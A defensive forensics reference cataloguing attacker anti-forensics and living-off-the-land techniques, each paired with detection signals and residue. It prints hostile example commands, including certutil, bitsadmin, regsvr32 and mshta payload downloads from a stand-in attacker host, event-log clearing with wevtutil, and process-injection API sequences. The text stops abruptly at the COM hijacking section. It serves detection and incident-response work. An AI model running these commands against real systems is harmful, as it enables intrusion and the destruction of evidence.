# 05 — Anti-Forensics and Attack Patterns

> Domain knowledge for downstream design. What attackers do, why they do it, what residue they leave, and how their kill chains assemble end-to-end. No architectural prescriptions. No "the agent should." Just the facts that have to be in the head of anyone designing or reviewing an IR system.

This file has three parts:

- **Part A — Anti-Forensics Catalog.** Thirty-five techniques attackers use to hide, deny, or destroy evidence. Per technique: mechanism, motive, artifact-level detection signals, residue that remains even when the technique succeeds.
- **Part B — Real-World Attack Pattern Playbooks.** Twenty kill chains a practitioner is expected to recognize on sight. Per playbook: typical sequence, artifact trail at each step, dwell time, distinguishing signatures.
- **Part C — MITRE ATT&CK Subset for Host Forensics.** The fourteen tactics with the techniques that matter most for disk-and-memory work, each mapped to concrete artifacts and common false positives. Ends with a Pyramid-of-Pain note on what TTP-level findings buy you over hash-level findings.

A recurring theme: **near-perfect erasure is unrealistic.** Almost every "evidence destruction" technique leaves second-order or third-order residue somewhere — the journal that records the deletion of the journal, the page-cache copy of the file that was wiped, the prefetch entry for the wiper itself. Detection is mostly about knowing where the residue lives.

---

# Part A — Anti-Forensics Catalog

## 1. Timestomping

**What attackers do.** Overwrite NTFS timestamps on dropped binaries, persistence scripts, or staged exfil archives so they blend into baseline OS file populations. The goal is to defeat the "files modified in the last 24 hours" sweep that opens almost every triage. The classic move is to copy timestamps from `C:\Windows\System32\kernel32.dll` onto a freshly-deployed `c:\programdata\update.exe`.

**Mechanism.**
- Windows API: `SetFileTime` against an open handle; many off-the-shelf tools (timestomp.exe from the original Metasploit anti-forensics suite, SetMACE, nTimestomp, Cobalt Strike's `timestomp` command) wrap it.
- PowerShell: `(Get-Item file).CreationTime = "..."`, `LastWriteTime`, `LastAccessTime`. Same for `Set-ItemProperty`.
- *nix style on cygwin/WSL: `touch -d "2018-01-15 10:00" file`.
- Lower-level: writing to `$STANDARD_INFORMATION` directly via raw disk access (rare; signals a serious adversary).

**Why.** Hide a dropper in plain sight by giving it timestamps consistent with OS install. Defeat timeline analysis. Frustrate `find / -newer` style sweeps.

**Detection — SI vs FN divergence.** Every NTFS file has two timestamp sets:
- **$STANDARD_INFORMATION (SI):** the "normal" timestamps visible in Explorer; user-mode APIs write these.
- **$FILE_NAME (FN):** maintained by the kernel inside the parent directory's `$INDEX_ALLOCATION`; user-mode timestomp tools historically cannot touch these. Updated on rename, move, and creation.

When SI predates FN, or SI and FN are wildly inconsistent, that is a near-certain timestomp tell. `mft2csv`, `MFTECmd`, `analyzeMFT`, and Plaso's `mft` parser all surface both sets. The classic finding: SI shows 2009-07-13 (kernel32.dll-style), FN shows last Tuesday.

**Detection — sub-second precision tell.** Windows internally stores NTFS timestamps as 100-nanosecond intervals since 1601. Native filesystem operations populate all seven digits of sub-second precision. Many timestomp tools and `touch -d` style operations only set down to the second, leaving the sub-second field as exact zeros. A file with `CreationTime = 2018-01-15 10:00:00.0000000` exactly is suspicious; legitimate file creation will show something like `2018-01-15 10:00:01.3475281`.

**Detection — USN journal residue.** The USN change journal `$Extend\$UsnJrnl:$J` records every metadata change, including the SetFileTime ones. Even if the attacker stomped successfully, the USN entry shows a `BASIC_INFO_CHANGE` reason flag at the actual time of stomping. Plaso (`usnjrnl` parser), `MFTECmd -j`, `UsnJrnl2Csv` all extract this. USN entries also reference the file by its FRN, so even renamed/deleted files are traceable.

**Detection — $LogFile transaction residue.** NTFS transaction log `$LogFile` keeps a circular journal of MFT operations. Tools like `LogFileParser`, `NTFS LogTracker`, `INDXParse.py` can recover MFT entry versions from before the stomp. Window is small (the log is circular, typically 64MB) but on quiet systems it can hold days.

**Detection — Prefetch / Amcache cross-reference.** A binary's Prefetch first-run time and Amcache first-execution timestamp don't lie. If the .exe's SI MACE all say 2009 but its Prefetch entry is from Tuesday, stomp is confirmed.

**Detection — $Logged Utility Streams.** Some EDR products and certain Windows features leave additional metadata streams that record true creation events.

**Residue summary.** USN $J, $LogFile, $FILE_NAME, sub-second precision, Prefetch first-run, Amcache first-execution, ShimCache mtime — at least three of these will disagree with the stomped SI in a typical case.

---

## 2. Log clearing (full)

**What attackers do.** Wipe the Windows Security, System, or Application event log entirely. Either to destroy a specific event (a 4624 logon, a 4688 process create, a 4697 service install) or to scorch-earth before withdrawal.

**Mechanism.**
- `wevtutil cl Security` (and `cl System`, `cl Application`, `cl "Microsoft-Windows-PowerShell/Operational"`)
- PowerShell: `Clear-EventLog -LogName Security`, `Wevtutil cl`
- Programmatic: `EvtClearLog` Windows API
- Raw: open the .evtx file, truncate or overwrite
- Stop the EventLog service, replace the .evtx file, restart

**Why.** Remove evidence of authentication, process execution, service install, scheduled task creation, audit policy change. After a hands-on-keyboard intrusion this is the single highest-yield cleanup step.

**Detection — EID 1102 (Security) and EID 104 (System / Application).** This is the central tell. When the Security log is cleared via approved API, Windows itself writes a record-of-clearing to the *new* empty Security log: **Event ID 1102, "The audit log was cleared."** The record contains:
- `SubjectUserSid` of the account that cleared it
- `SubjectUserName`, `SubjectDomainName`
- Timestamp
- ProcessName (often `wevtutil.exe` or `mmc.exe`)

For System / Application / other logs, the equivalent is **EID 104** ("The %1 log file was cleared"). These are written by the OS, not the application, so they appear even when only Security is targeted.

**Detection — USN $J residue of the .evtx file.** Even if the .evtx file was replaced or truncated outside of the API, the USN journal logs every change to `C:\Windows\System32\winevt\Logs\Security.evtx` — opens, truncates, allocations, deallocations. A sudden burst of $J activity on the Security.evtx file, especially `DATA_OVERWRITE | DATA_TRUNCATION`, is the signature.

**Detection — $LogFile cluster recovery.** The .evtx file's deleted/overwritten clusters often remain partly intact in unallocated space. `bulk_extractor` with the `evtx` scanner, `EVTXtract` (Willi Ballenthin), and raw carving with `foremost`/`scalpel`/`photorec` can pull individual EVTX chunks (`ElfChnk` records) from free space. Each chunk is self-describing — channel name, computer name, EID range — so chunks from Security.evtx are identifiable.

**Detection — backup / forwarding.** Many environments forward Windows events to a SIEM via Windows Event Forwarding or a syslog/Beats agent. The local log clear does nothing to those copies. Sysmon's own log (Microsoft-Windows-Sysmon/Operational) is often forwarded separately and survives Security clears. Domain controllers often replicate auth events as well.

**Detection — Volume Shadow Copies.** If VSS was active, older .evtx files live in shadow copies. `vshadowmount` (libyal) exposes shadow copies as mountable images.

**Residue summary.** EID 1102 / 104, USN $J burst, $LogFile, raw EVTX chunks in unallocated, forwarded copies, VSS copies, Sysmon channel — usually at least two survive.

---

## 3. Selective log filtering / editing

**What attackers do.** Less common, more sophisticated: instead of clearing a whole log, splice out the records that incriminate them and leave everything else.

**Mechanism.** Stop the EventLog service, parse the .evtx file (XML, but inside a binary container format documented in MS-EVEN6), remove specific records or rewrite chunk-level CRCs, restart the service. Tools like `EVTXtract`, `python-evtx`, `dnsadmin` style libraries can read/write the format.

**Detection — mismatched EID sequence.** Within an .evtx chunk, records have monotonically increasing `EventRecordID` fields. Gaps are the giveaway. `EVTXECmd` (Eric Zimmerman) and similar parsers can dump record IDs; jumps from ID 4521 to 4534 with no clear ID at 4522-4533 are diagnostic. Also: the chunk header records `FirstEventRecordID` and `LastEventRecordID`; if those don't match what the chunk actually contains, surgery happened.

**Detection — CRC mismatch.** Each EVTX chunk has a CRC32 in its header (`ElfChnk` magic). Editing records without recomputing the CRC fails validation; tools that fix the CRC are rare and easy to identify by behavior. Standard parsers will refuse to load chunks with bad CRCs and report it.

**Detection — time-ordering anomalies.** Records within a chunk are time-ordered by the OS. Anti-forensic surgery that doesn't preserve order shows up as `TimeCreated` going backwards inside a chunk.

**Residue summary.** Gaps in EventRecordID, broken CRC32, time inversion, $LogFile / USN $J entries showing the file was opened for write after the timeframe of the missing events.

---

## 3a. Selective registry editing — adjacent to log filtering

Less commonly catalogued but worth noting alongside log surgery: attackers also selectively edit hive files to remove individual values rather than clear whole keys. Tools like `RegRipper`, `Registry Explorer` (Zimmerman), and `python-registry` parse hive transaction logs (`.LOG1`, `.LOG2` on modern Windows) that record the last few hours of changes. When an attacker writes to NTUSER.DAT or SOFTWARE/SYSTEM hives, the change first hits the LOG and then gets applied to the main hive on flush. The LOG residue often shows what the value was *before* the attacker overwrote it. Forensic value: a key whose current value is innocuous but whose LOG shows it being overwritten near other suspicious activity is highly informative.

Hive offline carving via `regipy`, `RegRipper`, `hivex` (libforensic1394) can also surface deleted registry values; the hive's slack space retains old values that were superseded but not zeroed.

---

## 4. Alternate Data Streams (ADS)

**What attackers do.** Hide payloads in NTFS alternate data streams attached to innocuous files or directories. Streams are invisible to most directory listings and to many AV scanners (historically; modern engines are better but not universally).

**Mechanism.** NTFS supports multiple `$DATA` attributes per file, named `filename:streamname`. `notepad legit.txt:hidden.exe` writes to a stream; `more < legit.txt:hidden.exe` reads it. PowerShell: `Set-Content -Path C:\x.txt -Value ... -Stream hidden`. Execution from a stream historically worked via `start c:\x.txt:hidden.exe`; modern Windows restricts this but `wmic process call create`, `forfiles`, and certain LOLBins still permit it.

**Zone.Identifier as baseline.** The most common ADS by far is `:Zone.Identifier`, written by Internet Explorer / Edge / Chrome / Outlook / SmartScreen on every downloaded file. Format:
```
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://...
HostUrl=https://...
```
ZoneId 3 = Internet, 4 = Untrusted. This is benign and ubiquitous; about half of all ADS hits on a typical workstation are Zone.Identifier. **Knowing the baseline matters** — non-Zone.Identifier streams on system binaries or in user directories are the interesting hits.

**Other common benign ADS.** `:encryptable` on some files, `:SmartScreen`, `:AFP_AfpInfo` (Mac interop), `:OECustomProperty` (Outlook), `:com.dropbox.attrs`.

**Detection.**
- **Sysmon EID 15** ("File stream created") fires on every ADS creation. The stream name is captured. Filter `Zone.Identifier` to noise-suppress.
- `dir /r` — built-in Windows; shows streams.
- Sysinternals `streams.exe`.
- `fsutil file enumeratestreams`.
- PowerShell: `Get-Item -Path C:\x.txt -Stream *`.
- Forensic image analysis: `icat`/`fls` from Sleuthkit (`fls -r -i raw -f ntfs image.dd`), MFTECmd, analyzeMFT, X-Ways.

**Residue.** Streams survive copy to other NTFS volumes but are stripped on copy to FAT/exFAT/ext4/network shares without stream support — so a stream that "moved" through an SMB share to an exFAT USB drive will be gone, but a stream that lives on the same NTFS volume is permanent until the parent file is deleted.

**MFT signal.** Each named stream is its own `$DATA` attribute in the MFT entry. Counting `$DATA` attributes on an entry quickly surfaces files with non-Zone.Identifier streams.

---

## 5. Living-off-the-Land Binaries (LOLBins / LOLBAS)

**The category.** Microsoft-signed Windows binaries that have legitimate purposes but can be misused to download, execute, persist, or bypass controls. The authoritative catalog is **LOLBAS** (lolbas-project.github.io), tracking 200+ binaries with documented abuse paths. The defensive challenge is that these binaries are signed, often whitelisted, and have legitimate uses — blocking outright is rarely possible.

### certutil.exe
- **Abuse.** Download arbitrary files via URL cache, base64 decode/encode arbitrary payloads.
- **Indicators.**
  - `certutil -urlcache -split -f http://attacker/x.exe %temp%\x.exe` — downloads file
  - `certutil -urlcache -f -split http://...` (variations)
  - `certutil -decode encoded.txt out.exe` — base64 decode
- **Detection.** Process command line containing `urlcache`, `verifyctl`, `decode`, `decodehex` with non-local arguments. Sysmon EID 1 with ParentImage = explorer.exe / winword.exe / powershell.exe and certutil with URL argument is essentially diagnostic.
- **Residue.** URL cache entries in `C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\` and `MetaData\`. Downloaded file with Mark-of-the-Web in `:Zone.Identifier` if Smart Screen had a chance to tag it; often it does not for certutil-downloaded files (this is a real anti-forensic property of using certutil).

### bitsadmin.exe / BITS jobs
- **Abuse.** `bitsadmin /transfer JobName http://attacker/x.exe %temp%\x.exe` downloads via the Background Intelligent Transfer Service. BITS persistence: queue a job that retries forever and runs a command on completion.
- **Indicators.** `bitsadmin /transfer`, `bitsadmin /SetNotifyCmdLine`, `bitsadmin /create` followed by `/addfile`. PowerShell equivalent: `Start-BitsTransfer`.
- **Detection.** Microsoft-Windows-Bits-Client/Operational log (EIDs 59, 60, 61). Job queue file: `C:\ProgramData\Microsoft\Network\Downloader\qmgr.db` (parser: `bits_parser`).
- **Residue.** BITS qmgr.db survives reboot; jobs can be inspected with `bitsadmin /list /allusers`.

### rundll32.exe
- **Abuse — javascript:.** `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe")` — runs JS in process.
- **Abuse — no DLL path.** `rundll32.exe shell32.dll,Control_RunDLL` legitimately; attackers leverage variants like `rundll32.exe ,Control_RunDLL` to invoke from CWD or weird paths.
- **Abuse — DLL from suspicious location.** `rundll32.exe c:\users\public\evil.dll,DllMain` — execution of attacker-controlled DLL.
- **Detection.** Sysmon EID 1: process command line contains `javascript:`, `vbscript:`, or DLL path in user-writable directory. Parent process is often Office or Outlook.

### regsvr32.exe (Squiblydoo)
- **Abuse.** `regsvr32.exe /s /n /u /i:http://attacker/payload.sct scrobj.dll` — fetches and executes a remote .sct (scriptlet) file in process, bypassing application whitelisting on default Windows configs. Named by Casey Smith ("Squiblydoo"); discovered 2016 and never fully patched because it's documented behavior.
- **Indicators.** `regsvr32` with `/i:http`, `/i:https`, `/i:\\share`. The `/u` (unregister) flag combined with `/i` is the classic Squiblydoo.
- **Detection.** Sysmon EID 1 + EID 3 (network connection by regsvr32.exe). AppLocker policies can block but the technique survives misconfiguration.

### mshta.exe
- **Abuse.** Executes HTML Application files which include script. `mshta.exe http://attacker/x.hta` or `mshta.exe vbscript:CreateObject("WScript.Shell").Run("calc.exe")(window.close)`. Phishing payloads frequently use .hta delivery because Office launching mshta.exe is the only spawn.
- **Indicators.** mshta with HTTP/HTTPS argument, mshta with inline `vbscript:` or `javascript:`, mshta launched by an Office app.
- **Detection.** Sysmon EID 1 + EID 3. Parent process Office app + child mshta is high-confidence malicious.

### wmic.exe
- **Abuse — local exec.** `wmic process call create "powershell -e ..."`.
- **Abuse — remote exec.** `wmic /node:targetIP /user:admin /password:pass process call create "..."` — lateral movement without dropping a service binary; PsExec without the artifact.
- **Abuse — recon.** `wmic /node:target service get name,pathname`, `wmic startup list full`, `wmic product list`.
- **Indicators.** wmic with `process call create`, wmic with `/node:`, wmic with `useraccount`/`shadowcopy`/`csproduct` for recon.
- **Detection.** Sysmon EID 1 on wmic.exe with arg analysis. EID 4688 includes command line on properly-configured systems. WMI-Activity/Operational log (EIDs 5857, 5858, 5859, 5860, 5861) catches WMI subscription / consumer activity.
- **Deprecation note.** Microsoft began deprecating wmic.exe starting Server 2022 / Windows 11 22H2. Attackers shifted to PowerShell `Get-CimInstance` for equivalent capability.

### cmstp.exe
- **Abuse.** Installs Connection Manager service profiles via INF; INF can specify arbitrary `RunPreSetupCommands` / `RunPostSetupCommands`. `cmstp.exe /s evil.inf` runs commands as the executing user; if launched via UAC bypass, as Administrator without prompt.
- **Detection.** cmstp.exe with INF arg, especially with `/s` (silent). The launched command line is the actual payload; Sysmon EID 1 on the child process catches it.

### InstallUtil.exe
- **Abuse.** Component of .NET Framework, location `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe` (and Framework64). Runs an `Installer` class in a .NET DLL/EXE, which can include arbitrary `Uninstall` code. `InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe`.
- **Detection.** InstallUtil command line with `/U` and a non-system EXE path. The .NET assembly's path is typically in user-writable space.

### regasm.exe / regsvcs.exe
- **Abuse.** Same as InstallUtil — execute arbitrary COM-registration code in a .NET assembly. `regasm.exe /codebase evil.dll`, `regsvcs.exe evil.dll`.
- **Detection.** Sysmon EID 1 on regasm/regsvcs with non-system DLL argument; usually invoked from a user-writable directory.

### msbuild.exe
- **Abuse.** `msbuild.exe evil.xml` — MSBuild project files (XML) can contain inline tasks compiled and executed at parse time (`<UsingTask>` with `<Code>` block). Defender for Endpoint and many EDRs caught up on this; survived for years pre-2020.
- **Detection.** msbuild.exe with non-standard file extension (.xml, .csproj in user temp), msbuild parented by Office or PowerShell.

### dnscmd.exe (DLL hijack)
- **Abuse.** Registering a malicious DNS server plugin DLL: `dnscmd.exe /config /serverlevelplugindll \\attacker\share\evil.dll` on a domain controller running DNS service. The DLL loads on next DNS service restart with SYSTEM privileges.
- **Detection.** Audit Object Access on `HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`. Registry modification events (4657).

### PrintBrm.exe / PrintNightmare-adjacent
- **Abuse.** PrintBrm restores printer configurations from .printerExport ZIP files; CVE-2021 era saw print spooler abuses (PrintNightmare CVE-2021-34527) where loading a malicious driver DLL via the spooler service gave SYSTEM.
- **Detection.** Print Spooler service writing DLLs to `C:\Windows\System32\spool\drivers\x64\3\`, especially DLLs not signed by a printer vendor. EIDs in Microsoft-Windows-PrintService/Operational and /Admin.

### Other notable LOLBins
- `forfiles.exe /p c:\windows /m notepad.exe /c "c:\evil.exe"` — execution via forfiles
- `xwizard.exe RunWizard {00000000-...}` — COM object invocation
- `pcalua.exe -a evil.exe` — Program Compatibility Assistant launcher
- `extexport.exe c:\evil 1 2 3` — DLL search-order hijack vehicle in IE folder
- `ie4uinit.exe -BaseSettings` — runs commands from .inf
- `mavinject.exe PID /INJECTRUNNING evil.dll` — DLL injection into running process
- `at.exe` — legacy scheduled task creation (gone after Win10/Server 2019 but still on older systems)
- `schtasks.exe /create` — scheduled task creation; persistence vehicle (T1053.005)
- `MpCmdRun.exe -DownloadFile -url http://...` (Defender's own CLI tool can be coerced into downloads)
- `appvlp.exe` — App-V launcher, used for AppLocker bypass on Office boxes

**Detection meta-pattern.** Most LOLBin abuse is detectable by the *parent process + command line* combination, not the binary itself. `certutil.exe` parented by `winword.exe` with an HTTP URL in the command line is not a normal Windows workflow; the same `certutil.exe` parented by an Microsoft Endpoint Manager process is.

---

## 6. Process hollowing

**What attackers do.** Spawn a legitimate process (`svchost.exe`, `explorer.exe`, a browser) in suspended state, gut its in-memory image, replace with malicious code, resume. The process listing shows a normal-looking signed binary; the running code is something else entirely. Classic technique from the early 2010s, still in widespread use because EDRs can be inconsistent at detecting it.

**Mechanism.**
1. `CreateProcessW(..., CREATE_SUSPENDED, ...)` — launch target in suspended state
2. `NtQueryInformationProcess` to find the PEB and image base
3. `NtUnmapViewOfSection` (or `ZwUnmapViewOfSection`) — unmap original executable image
4. `VirtualAllocEx` at the same base, RWX
5. `WriteProcessMemory` — write malicious PE headers and sections
6. `SetThreadContext` — point the entry thread at malicious entry point
7. `ResumeThread`

**Variants.** Process Doppelgänging (uses NTFS transactions, see next), Process Herpaderping (modifies file on disk between mapping and execution), Process Ghosting (deletes file after mapping). All are evolutions of the basic hollow.

**Detection — Volatility 3.**
- `windows.ldrmodules` — compares three module lists (PEB load order, PEB init order, PEB memory order) against VAD-tree mapped images. Hollowed processes show the original binary in load lists but the VAD-mapped memory does not match the on-disk image; output flags `False` in one of the three columns.
- `windows.malfind` — finds memory regions that are RWX, private, and contain code. Hollowed processes typically have RWX regions where the main image should be.
- `windows.dlllist` — comparing DLLs in the process to what should be loaded for that binary; hollowed processes often lack the normal DLL chain.
- `windows.cmdline` — the command line in the PEB still shows the original target, but the actual code is different.

**Detection — image-base mismatch.** The PE optional header's `ImageBase` value can differ from where the malicious payload was mapped. Volatility's `procdump` plugin lets you dump the image and compare its `ImageBase` field against where it lives in the process VAD.

**Detection — disk vs memory hash mismatch.** Dump the running process image with `windows.procdump`, hash it, compare against the hash of the on-disk binary the process claims to be. Hollowed: hashes differ.

**Sysmon.** EID 8 (CreateRemoteThread) and EID 10 (ProcessAccess with GrantedAccess including PROCESS_VM_WRITE | PROCESS_CREATE_THREAD) can flag hollowing in real time. Sysmon EID 25 (Process Tampering) was added specifically for this class — "image is replaced" notification.

**Residue on disk.** The malicious payload was never written to disk in many cases; only the legitimate target binary was. ShimCache / Amcache reflect the legitimate binary having been executed. The fact that hollowing happened is invisible on disk unless the dropper or loader is recovered.

---

## 7. Process Doppelgänging

**What attackers do.** Use NTFS transactional file operations (TxF) to load a malicious image while the on-disk file appears legitimate. Disclosed by enSilo at Black Hat Europe 2017.

**Mechanism.**
1. `CreateTransaction`
2. `CreateFileTransacted` — open a transacted handle to a legitimate file
3. `WriteFile` — overwrite within the transaction with malicious code
4. `NtCreateSection(SEC_IMAGE, transacted handle)` — create a memory section from the transacted version
5. `RollbackTransaction` — on-disk file reverts; the section persists in memory
6. `NtCreateProcessEx` with the section — process launches running the malicious code; opens the now-legitimate file for inspection by EDR.

**Detection.** Difficult; Sysmon EID 25 catches it on modern Windows. Volatility 3 `malfind` flags the RWX region. The smoking gun is image-on-disk vs image-in-memory hash divergence, same as hollowing.

**Note.** Modern Windows (post-1809-ish) and Defender for Endpoint block the classic primitive; the technique inspired its successors below.

---

## 8. Process Herpaderping / Process Ghosting

**Herpaderping (Jonas L., 2020).** Open a file, map it as image, then overwrite the file contents on disk before the process is fully created. EDR scanning the file at creation time sees malicious content; scanning at process-runtime sees legitimate content (or vice versa, depending on EDR timing). The kernel uses a captured copy of the file for the in-memory section, so writes to the file *after* mapping don't propagate to the section — but EDRs that scan the file after `CreateProcess` returns see the post-write content. Detection: file-modification events (Sysmon EID 11) on a binary at the same instant a process derived from it spawns; the on-disk hash post-creation does not match the in-memory image hash.

**Ghosting (Gabriel Landau / Elastic, 2021).** Open a file with `FILE_SHARE_DELETE | DELETE` access, mark it for deletion (`SetFileInformationByHandle` with `FileDispositionInfo`), then create a section from the still-mapped-but-pending-delete file, then create a process from the section. The file is gone from disk by the time anyone looks. Detection: Sysmon EID 1 with `Image` pointing to a file that no longer exists; `Image` field shows the pre-delete path; Sysmon EID 25 (Process Tampering) fires on modern Sysmon for this case.

**Process Reimaging (McAfee research).** Earlier variant — abuses the kernel's behavior of reusing FILE_OBJECTs to make the process appear to come from a different binary than it really does. The `Image` field in process-creation telemetry can be made to point at any path the attacker wants.

**Common forensic signal across all three.** Process exists, image path resolves to a file that has been recently modified or deleted, and in-memory hash differs from any extant on-disk version. Memory analysis (`windows.procdump` + hash comparison) is the conclusive check; Sysmon EID 25 catches it live.

---

## 9. Atom Bombing

**What attackers do.** Inject code into another process by writing the shellcode into the global atom table — a kernel-managed string store used by Windows for inter-process string passing (window class names, clipboard format names, RPC interface identifiers) — and then forcing the target process to retrieve it via `GlobalGetAtomName` into an RWX buffer in the target's address space, then redirecting an APC in the target to execute the now-resident shellcode. Disclosed by enSilo (Tal Liberman, 2016).

**Why it was novel.** At the time, EDRs hooked `WriteProcessMemory` and `VirtualAllocEx` as the canonical injection markers. Atom Bombing did neither — it used `GlobalAddAtomA` (caller side) and `GlobalGetAtomName` (target side) instead, both of which are routine APIs not normally instrumented.

**Detection.** Volatility 3 has no dedicated plugin; the technique manifests as standard APC-injection symptoms: an APC queued from outside the target, an unexpected thread executing in a private RWX region, a ROP chain in the call stack pointing through `NtQueueApcThread`. Sysmon EID 8 (CreateRemoteThread) often fires when the injected APC ultimately calls CreateRemoteThread; EID 10 (ProcessAccess with PROCESS_VM_WRITE | PROCESS_VM_OPERATION) when the attacker accesses the target.

**Residue.** Nothing persistent on disk. The target process's memory has the injected region; if memory was captured, `malfind` finds it as an RWX private region with code; the atom table's entries themselves are non-persistent and cleared at session end.

---

## 10. APC injection

**What attackers do.** Queue an Asynchronous Procedure Call onto a thread of the target process; when the thread enters an alertable wait state, the APC runs, redirecting execution to attacker code.

**Mechanism.** `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` (the shellcode) → `OpenThread` (a thread in alertable state) → `QueueUserAPC` (or kernel-mode `NtQueueApcThread`).

**Variants.**
- **Early Bird APC** — queue the APC on the main thread of a newly created suspended process; APC runs as the thread initializes, before EDR hooks attach.
- **Atom Bombing APC** — combines with atom table to deliver payload.

**Detection.** Volatility 3 `windows.malfind` finds the injected RWX region. `windows.threads` lists thread start addresses; a thread starting in a private RWX region rather than a known module is the tell.

---

## 10a. Early Cascade Injection / Indirect injection variants

**Early Cascade Injection (Outflank, 2024).** Inject into a process before EDR userland hooks finish loading. Achieved by hooking the very early phases of process initialization in a child process spawned from a controlled parent; the child runs attacker code from inside the loader's earliest callbacks. Bypasses many EDRs whose hooks attach via DLL injection — those hooks aren't loaded yet at the moment of injection.

**Module Stomping (a.k.a. Module Overloading).** Load a legitimate DLL into a target process, then overwrite its `.text` section with attacker shellcode. The PEB/LDR entry is for the legitimate DLL (so signature checks pass); the executing code is not. Detection: in-memory hash of the DLL's code section vs on-disk; ldrmodules' three-way checks pass but procdump comparison fails.

**Thread Name Calling.** Set a thread's name (via `SetThreadDescription`) to a string that is itself shellcode, then redirect a thread to execute at the buffer holding the name. Esoteric; sometimes used by red teams to evade specific memory scanners that don't sweep thread-name regions.

**Function Stomping.** Overwrite a specific exported function's bytes in a legitimate loaded DLL with attacker code; invoke the function normally to trigger execution. Less invasive than full module stomp; harder to find without targeted hash comparison.

---

## 11. Reflective DLL load

**What attackers do.** Load a DLL into a process without calling `LoadLibrary` (which leaves PEB / LDR entries) or touching disk (the DLL bytes are sent over C2 directly into memory).

**Mechanism.** Stephen Fewer's 2008 technique. The DLL contains a `ReflectiveLoader` export — a function that, when called, parses its own PE headers in memory, resolves imports, applies relocations, and calls `DllMain`. The injecting process allocates memory in the target, writes the DLL bytes, and creates a thread starting at the `ReflectiveLoader` offset. PEB never sees the DLL.

**Detection.**
- Volatility 3 `windows.ldrmodules` — the memory region contains a PE but is not in any of the three PEB lists; the False/False/False pattern.
- `windows.malfind` — finds the RWX region with a PE header (MZ at start).
- `windows.dlllist` — does not show the DLL; comparing dlllist to ldrmodules / VAD-PE-headers exposes the gap.

**Operational note.** Cobalt Strike's `beacon` payload, Meterpreter, Empire, and most modern in-memory frameworks use reflective load. Sysmon EID 7 (ImageLoad) does *not* fire for reflectively loaded DLLs because LoadLibrary was bypassed — by design.

---

## 12. Process Hopping

**What attackers do.** Migrate execution from one process to another to evade detection or to gain privileges. Meterpreter's `migrate` command and Cobalt Strike's `inject` / `spawn` commands automate this.

**Detection.** Sysmon EID 8 (CreateRemoteThread) on cross-process thread creation. Memory analysis shows injected regions in multiple processes with similar shellcode signatures. Network signature: a new process starts initiating C2 connections that the previous process was making.

---

## 13. AppInit_DLLs, AppCertDlls, IFEO Debugger

### AppInit_DLLs (T1546.010)
- **Key.** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows` value `AppInit_DLLs` (string) and `LoadAppInit_DLLs` (DWORD = 1).
- **Behavior.** Every user-mode process loading user32.dll loads the listed DLLs. Effectively system-wide injection.
- **Defense.** Disabled by default on Windows 10+ when Secure Boot is on; needs `RequireSignedAppInit_DLLs = 0` to load unsigned. Still works on misconfigured boxes.
- **Detection.** Autoruns flags this autostart location. Registry monitoring (Sysmon EID 13).

### AppCertDlls
- **Key.** `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls`.
- **Behavior.** DLLs listed here load into processes that call `CreateProcess`, `CreateProcessAsUser`, `CreateProcessWithLogon`, `WinExec`. Less surface than AppInit but still wide.

### Image File Execution Options (IFEO) Debugger
- **Key.** `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exename>` value `Debugger` (string).
- **Behavior.** When Windows is asked to launch `<exename>`, it instead launches `Debugger` with `<exename>` as the first argument. Originally for attaching debuggers automatically; classic abuse: set `Debugger` on `sethc.exe` (sticky keys) to `cmd.exe` and get SYSTEM cmd on the lock screen.
- **Persistence pattern.** IFEO on common targets: `notepad.exe`, `taskmgr.exe`, `osk.exe`, `magnify.exe`, `narrator.exe`, `utilman.exe`, `winlogon.exe`. The latter cluster (osk/magnify/narrator/utilman) is accessible from the secure attention sequence on the lock screen — pre-auth code execution.
- **GlobalFlag tampering.** IFEO has a `GlobalFlag` value; setting bit `0x200` (FLG_MONITOR_SILENT_PROCESS_EXIT) plus the related `SilentProcessExit` key spawns a debugger on process exit — another persistence vector ("LSASS dump on exit" trick).
- **Detection.** Audit/log writes to `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*\Debugger`. Sysmon EID 12/13 on the IFEO path.

---

## 14. DLL search order hijacking + DLL side-loading

**Why it works.** When a Windows process loads a DLL by name, the loader searches a defined sequence: the directory of the executable, system directories, current directory, PATH. If a DLL by the same name is present in an earlier-searched directory than where the legitimate DLL lives, the attacker's DLL loads. KnownDLLs in the registry pre-resolves about 100 common DLLs and exempts them, but hundreds of others are vulnerable.

**Side-loading (T1574.002).** Pure variant: drop a legitimate signed binary plus a malicious DLL it loads-by-name into the same directory; user double-clicks the signed binary; malicious DLL loads under the cover of the signature. Classic example: a signed Notepad++ binary plus a malicious `version.dll`. Plays brilliantly against signature-based AV.

**Common hijackable DLLs.** `version.dll`, `dwmapi.dll`, `cryptbase.dll`, `cryptsp.dll`, `winmm.dll`, `wer.dll`, `userenv.dll`. The Hijack Libs project (`hijacklibs.net`) maintains an actively-updated catalog of vulnerable signed binaries and the DLLs they're vulnerable through.

**Hallmark of a hijackable target.** Loads DLLs by name without absolute path. Uses LoadLibrary instead of LoadLibraryEx with absolute path. KnownDLLs registry doesn't cover the DLL. Signed but not Authenticode-checked at load time.

**Detection.**
- Sysmon EID 7 (ImageLoad) for unsigned DLLs from `C:\Users\`, `C:\ProgramData\`, `C:\Temp\` — anywhere user-writable.
- Same EID for DLLs whose signing publisher doesn't match the parent EXE.
- File-system layout: a signed EXE + an unsigned DLL with a Microsoft-DLL-style name in `%APPDATA%\` or similar.
- Process parent + image: `explorer.exe → signed.exe → loads c:\users\public\version.dll` is the textbook chain.

**Residue.** The dropped DLL and EXE on disk; Prefetch entries for the signed EXE running from the unusual path; Amcache for the EXE.

---

## 15. COM hijacking

**What attackers do.** Modify Component Object Model registration so that a benign CLSID resolves to attacker-controlled code. When any program requests that COM object, the attacker's code runs in its process context.

**Common keys.**
